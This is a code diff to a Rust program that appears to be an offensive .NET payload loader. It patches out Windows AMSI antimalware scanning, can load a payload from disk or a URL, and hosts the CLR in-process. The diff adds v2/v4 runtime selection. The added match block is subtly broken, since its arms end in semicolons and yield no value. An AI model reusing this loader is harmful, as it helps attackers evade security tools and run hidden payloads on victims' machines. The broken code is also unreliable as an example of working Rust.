@@ -7,8 +7,8 @@ use clap::Parser;
 use clr::util;
 use file::{get_payload_from_filesystem, get_payload_from_url};
 
-//const CLR_VERSION: &str = "v4.0.30319";
-const CLR_VERSION: &str = "v2.0.50727";
+const CLR_VERSION_V4: &str = "v4.0.30319";
+const CLR_VERSION_V2: &str = "v2.0.50727";
 
 fn main() {
     if let Err(e) = patch::patch_amsi() {
@@ -20,15 +20,25 @@ fn main() {
 
     let installed_versions = util::get_installed_runtime_versions();
 
-    let is_expected_version = installed_versions.contains_key(CLR_VERSION);
-    if !is_expected_version {
+    let is_installed_v4 = installed_versions.contains_key(CLR_VERSION_V4);
+    let is_installed_v2 = installed_versions.contains_key(CLR_VERSION_V2);
+    if !is_installed_v4 && !is_installed_v2 {
         println!("Expected CLR version is not installed.");
         return;
     }
 
-    let cor_runtime_host = clr::runtime_host::CLRRuntimeHost::from(
-        installed_versions.get(CLR_VERSION).unwrap().clone(),
-    );
+    let cor_runtime_host = match is_installed_v2 {
+        true => {
+            clr::runtime_host::CLRRuntimeHost::from(
+                installed_versions.get(CLR_VERSION_V2).unwrap().clone(),
+            );
+        },
+        false => {
+            clr::runtime_host::CLRRuntimeHost::from(
+                installed_versions.get(CLR_VERSION_V4).unwrap().clone(),
+            );
+        },
+    }
 
     let appdomain = cor_runtime_host.create_domain();
 
